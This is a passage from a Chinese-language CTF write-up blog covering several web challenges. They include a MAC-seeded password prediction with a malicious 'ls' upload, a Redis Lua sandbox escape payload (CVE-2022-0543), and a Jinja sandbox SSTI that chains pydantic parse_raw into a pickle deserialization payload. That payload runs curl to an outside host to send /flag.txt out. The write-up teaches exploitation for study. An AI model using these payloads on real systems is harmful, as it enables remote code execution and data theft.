status=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> web.FileResponse(<span class="string">&#x27;./template/index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.post()</span><br><span class="line">    username = data[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> authenticate(username, password):</span><br><span class="line">        session = <span class="keyword">await</span> get_session(request)</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        response = web.HTTPFound(<span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line">        response.session = session</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> web.Response(text=<span class="string">&quot;账号或密码错误哦&quot;</span>, status=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">request</span>):</span><br><span class="line">    session = <span class="keyword">await</span> get_session(request)</span><br><span class="line">    user = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> web.FileResponse(<span class="string">&#x27;./template/home.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> web.HTTPFound(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    session = <span class="keyword">await</span> get_session(request)</span><br><span class="line">    user = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        reader = <span class="keyword">await</span> request.multipart()</span><br><span class="line">        file = <span class="keyword">await</span> reader.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            filename = <span class="string">&#x27;./static/&#x27;</span> + file.filename</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = <span class="keyword">await</span> file.read_chunk()</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    f.write(chunk)</span><br><span class="line">            <span class="keyword">return</span> web.HTTPFound(<span class="string">&quot;/list&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = web.HTTPFound(<span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> web.HTTPFound(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ListFile</span>(<span class="params">request</span>):</span><br><span class="line">    session = <span class="keyword">await</span> get_session(request)</span><br><span class="line">    user = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    command = <span class="string">&quot;ls ./static&quot;</span></span><br><span class="line">    <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        result = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, text=<span class="literal">True</span>, capture_output=<span class="literal">True</span>)</span><br><span class="line">        files_list = result.stdout</span><br><span class="line">        <span class="keyword">return</span> web.Response(text=<span class="string">&quot;static目录下存在文件\n&quot;</span>+files_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> web.HTTPFound(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">init_app</span>():</span><br><span class="line">    app = web.Application()</span><br><span class="line">    app.router.add_static(<span class="string">&#x27;/static/&#x27;</span>, <span class="string">&#x27;./static&#x27;</span>, follow_symlinks=<span class="literal">True</span>)</span><br><span class="line">    session_setup(app, EncryptedCookieStorage(secret_key=CreteKey()))</span><br><span class="line">    app.middlewares.append(middleware)</span><br><span class="line">    app.router.add_route(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, index)</span><br><span class="line">    app.router.add_route(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, login)</span><br><span class="line">    app.router.add_route(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>, home)</span><br><span class="line">    app.router.add_route(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/upload&#x27;</span>, upload)</span><br><span class="line">    app.router.add_route(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/list&#x27;</span>, ListFile)</span><br><span class="line">    <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line">web.run_app(init_app(), host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>这里 admin 密码使用了随机数，然而随机数的 randseed 设置如下，<code>random.seed(uuid.getnode())</code>.<br>uuid.getnode() 是Python中用于获取本机硬件地址（通常是MAC地址）的方法。它返回一个48位的正整数，表示设备的硬件地址。因此这里种子是固定值，即 MAC 地址，我们可以通过文件读取获取这个种子。<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/16.png" alt="alt text"></p>
<p>得到种子之后，可以预测 rand 的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">random.seed(<span class="number">0x0242ac11000f</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>)))</span><br></pre></td></tr></table></figure>

<p>要注意的是，这里的密码每一次调用比较，就会重新调用一次这个表达式，得到的值是不一样的，建议直接重启靶机之后做这个题目。</p>
<p>登陆上去可以上传文件。<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/17.png" alt="alt text"></p>
<p>这里代码会把文件上传到 static 下，然后再 &#x2F;list 路由下会调用 ls，可以看到自己 &#x2F;static 下的文件。</p>
<p>但是这里存在任意文件上传，如果我们上传一个恶意的 ls 文件，然后访问 ls，触发这个恶意文件。</p>
<p>上传的 ls 文件内容如下：<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/18.png" alt="alt text"></p>
<p>这样访问 list 就会触发这个恶意的 ls.<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/19.png" alt="alt text"></p>
<p>得到 flag 名字，直接读取或者继续污染一次 ls 即可。</p>
<h2 id="ez-redis"><a href="#ez-redis" class="headerlink" title="ez_redis"></a>ez_redis</h2><p>考了个 Redis 命令执行以及其历史漏洞</p>
<p>有源码泄露，访问 &#x2F;<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 即可</p>
<p>关键点在：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;eval&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;eval&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/set|php/i&quot;</span>, <span class="variable">$cmd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&#x27;return &quot;u are not newstar&quot;;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$example</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$example</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$REDIS_HOST</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$example</span>-&gt;<span class="keyword">eval</span>(<span class="variable">$cmd</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1 class=&quot;subtitle&quot;&gt;结果&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$result</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>搜索 Redis 常用利用方法，发现如果过滤了 set php，那么我们很难通过写 webshell，写入计划任务、主从复制来进行 getshell</p>
<p>于是我们搜索⼀下 Redis 5 的历史漏洞</p>
<p>发现 CVE-2022-0543 值得一试: Redis Lua 沙盒绕过命令执行（CVE-2022-0543）</p>
<p>于是我们得到了⼀个 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>

<p>由于我们网站执行的是 redis 命令</p>
<p>于是去掉外面的 eval 即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /flag&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res</span><br></pre></td></tr></table></figure>

<h2 id="jinjaclub"><a href="#jinjaclub" class="headerlink" title="jinjaclub"></a>jinjaclub</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2.sandbox <span class="keyword">import</span> SandboxedEnvironment</span><br><span class="line"><span class="keyword">from</span> jinja2.exceptions <span class="keyword">import</span> UndefinedError</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Form</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> typing_extensions <span class="keyword">import</span> Annotated</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span></span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    description: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="literal">None</span>] = <span class="literal">None</span></span><br><span class="line">    age: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Template</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    source: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span>, response_class=HTMLResponse</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;TEST_OUTPUT&#x27;</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/preview&quot;</span>, response_class=HTMLResponse</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preview_page</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> // SOME THING THERE</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Mailer Preview&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Customize your ninja message:&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;form&quot; onsubmit=&quot;handleSubmit(event);&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;name&quot;&gt;Name variable:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;name&quot; name=&quot;name&quot; value=&quot;John&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;description&quot;&gt;Description variable:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;description&quot; name=&quot;description&quot; placeholder=&quot;Describe yourself here...&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;age&quot;&gt;Age variable:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;age&quot; name=&quot;age&quot; type=&quot;number&quot; value=&quot;18&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;template&quot;&gt;Template:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;textarea id=&quot;template&quot; name=&quot;template&quot; rows=&quot;10&quot;&gt;Hello &#123;&#123;user.name&#125;&#125;, are you older than &#123;&#123;user.age&#125;&#125;?&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;button type=&quot;submit&quot;&gt;Preview&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;div id=&quot;output&quot;&gt;Preview will appear here...&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">        function handleSubmit(event) &#123;</span></span><br><span class="line"><span class="string">            event.preventDefault();</span></span><br><span class="line"><span class="string">            const data = new FormData(event.target);</span></span><br><span class="line"><span class="string">            const body = &#123;user: &#123;&#125;, template: &#123;source: data.get(&#x27;template&#x27;)&#125;&#125;;</span></span><br><span class="line"><span class="string">            body.user.name = data.get(&#x27;name&#x27;);</span></span><br><span class="line"><span class="string">            body.user.description = data.get(&#x27;description&#x27;);</span></span><br><span class="line"><span class="string">            body.user.age = data.get(&#x27;age&#x27;);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            fetch(&#x27;/preview&#x27;, &#123;</span></span><br><span class="line"><span class="string">                method: &#x27;POST&#x27;, </span></span><br><span class="line"><span class="string">                headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;,</span></span><br><span class="line"><span class="string">                body: JSON.stringify(body)</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">            .then(response =&gt; response.text())</span></span><br><span class="line"><span class="string">            .then(html =&gt; document.getElementById(&#x27;output&#x27;).innerHTML = html)</span></span><br><span class="line"><span class="string">            .catch(error =&gt; console.error(&#x27;Error:&#x27;, error));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">// SOME THING THERE</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> </span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/preview&quot;</span>, response_class=HTMLResponse</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_preview</span>(<span class="params">template: Template, user: User</span>):</span><br><span class="line">    env = SandboxedEnvironment()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        preview = env.from_string(template.source).render(user=user)</span><br><span class="line">        <span class="keyword">return</span> preview</span><br><span class="line">    <span class="keyword">except</span> UndefinedError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br></pre></td></tr></table></figure>

<p>明显是SSTI，但是有沙箱</p>
<p>看SandboxedEnvironment()的defination<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/20.png" alt="alt text"></p>
<p>sandbox 的过滤是要求不能调用对象以 _ 开头的, 以及 mro</p>
<p>本地调试下断可以看到, 当前 SSTI 的 Context 下只有这个, 我们在控制台里面调试调试, dir 一下<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/21.png" alt="alt text"></p>
<p>测试看到符合条件的有:</p>
<p>dict</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;clear&#x27;, &#x27;copy&#x27;, &#x27;fromkeys&#x27;, &#x27;get&#x27;, &#x27;items&#x27;, &#x27;keys&#x27;, &#x27;pop&#x27;, &#x27;popitem&#x27;, &#x27;setdefault&#x27;, &#x27;update&#x27;, &#x27;values’</span><br></pre></td></tr></table></figure>

<p>cycler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;current&#x27;, &#x27;next&#x27;, &#x27;reset’</span><br></pre></td></tr></table></figure>

<p>user</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;age&#x27;, &#x27;construct&#x27;, &#x27;copy&#x27;, &#x27;description&#x27;, &#x27;dict&#x27;, &#x27;from_orm&#x27;, &#x27;json&#x27;, &#x27;model_computed_fields&#x27;, &#x27;model_config&#x27;, &#x27;model_construct&#x27;, &#x27;model_copy&#x27;, &#x27;model_dump&#x27;, &#x27;model_dump_json&#x27;, &#x27;model_extra&#x27;, &#x27;model_fields&#x27;, &#x27;model_fields_set&#x27;, &#x27;model_json_schema&#x27;, &#x27;model_parametrized_name&#x27;, &#x27;model_post_init&#x27;, &#x27;model_rebuild&#x27;, &#x27;model_validate&#x27;, &#x27;model_validate_json&#x27;, &#x27;model_validate_strings&#x27;, &#x27;name&#x27;, &#x27;parse_file&#x27;, &#x27;parse_obj&#x27;, &#x27;parse_raw&#x27;, &#x27;schema&#x27;, &#x27;schema_json&#x27;, &#x27;update_forward_refs&#x27;, &#x27;validate’</span><br></pre></td></tr></table></figure>

<p>考虑一下 User 哪里来的这么多东西, 感觉其中的有些东西挺有趣的<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/22.png" alt="alt text"></p>
<p>发现是 BaseModel 的东西, 原来是继承了这玩意儿</p>
<p>我们看看 parse_file</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;user.parse_file(&quot;/flag.txt&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/23.png" alt="alt text"></p>
<p>真能! 但是继续测试发现他会把这个当成 JSON 解析, 和 flag 格式不符合</p>
<p>继续审计<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/24.png" alt="alt text"></p>
<p>看到了 pickle</p>
<p>通过传参:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;user.parse_raw(&quot;str&quot;, proto=&quot;pickle&quot;, allow_pickle=True)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现能够走到!</p>
<p>此时我们需要将 pickle 好的数据进行稳定的转换到 str 之后也能稳定转回bytes, 在一番测试和寻找后我们锁定到了 bytes.fromhex 于我们可以创建一个 Pickle</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl &lt;http://vps:port/`cat&gt; /flag.txt|base64`&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">user = User(<span class="string">&quot;kengwang&quot;</span>, <span class="string">&quot;hatepython&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(user).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 祖传 Pickle 利用脚本</span></span><br></pre></td></tr></table></figure>

<p>最终的 payload 为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;user.parse_raw(&quot;&quot;.encode(&quot;utf-8&quot;).fromhex(&quot;80049572000000000000008c086275696c74696e73948c046576616c9493948c565f5f696d706f72745f5f28276f7327292e73797374656d28276375726c20687474703a2f2f6374662e6b656e6777616e672e636f6d2e636e3a383038352f60636174202f666c61672e7478747c62617365363460272994859452942e&quot;), proto=&quot;pickle&quot;, allow_pickle=True)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PigSay"><a href="#PigSay" class="headerlink" title="PigSay"></a>PigSay</h2><p>转载自<a target="_blank" rel="noopener" href="https://www.woodwhale.cn/2025-r3ctf-misc-pigsay-wp/#chu-ti-guo-cheng">https://www.woodwhale.cn/2025-r3ctf-misc-pigsay-wp/#chu-ti-guo-cheng</a></p>
<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/25.png" alt="alt text"></p>
<h3 id="题目组成"><a href="#题目组成" class="headerlink" title="题目组成"></a>题目组成</h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span 